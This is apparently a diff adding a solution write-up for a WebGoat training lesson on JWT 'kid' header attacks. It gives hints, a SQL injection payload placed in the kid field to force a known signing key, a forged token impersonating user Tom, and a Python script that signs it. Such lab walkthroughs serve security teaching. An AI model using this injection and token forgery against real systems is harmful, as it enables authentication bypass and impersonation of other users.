@@ -1,0 +1,67 @@
+Hint Take a look at the token and specifically and the header
+Hint The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS
+Hint The key can be located on the filesystem in memory or even reside in the database
+Hint The key is stored in the database and loaded while verifying a token
+Hint Using a SQL injection you might be able to manipulate the key to something you know and create a new token.
+Hint Use: hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token
+
+Open the Development Tools in the browser, and go to the Network tab.
+On WebGoat, click on Delete.
+Locate the query to delete in the Network tab and click on Headers.
+Notice the parameter:
+token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOi
+JXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYX
+VkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycn
+kiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6i
+zOU638uUCi6UhiOJKYzoEZGE8
+In base64, this is decoded as:
+{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder",
+"iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com",
+"username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature
+Edit the first two parts of the token as
+{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
+INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}
+and
+
+{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,
+"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
+"Email":"jerry@webgoat.com","Role":["Cat"]}
+
+then calculate the new signature with deletingTom as the new key. 
+Use the Python script below for example.
+
+The new token is
+eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
+ZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc
+3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwN
+CwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiV
+G9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvO
+MQgRmPkZOetw7Ic1WbPvStS2B6U
+Click on Modify and Resend, modify the token with the newly generated parameter and send again the request.
+
+################################################################
+################################################################
+import base64  
+import hashlib  
+import hmac  
+  
+def jwt_tokens_8():  
+     def hmac_base64(key, message):  
+         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
+  
+     header = '{"typ":"JWT","kid":"hacked\' UNION select \'ZGVsZXRpbmdUb20=\' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}'.encode()  
+     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}'.encode()  
+  
+     new_token = (base64.urlsafe_b64encode(header).decode().rstrip('=') +  
+         '.' +  
+         base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
+     new_signature = hmac_base64('deletingTom'.encode(), new_token)  
+     new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
+  
+     print('New token: {}'.format(new_token.decode()))  
+     return  
+  
+jwt_tokens_8()
+
+################################################################
+################################################################
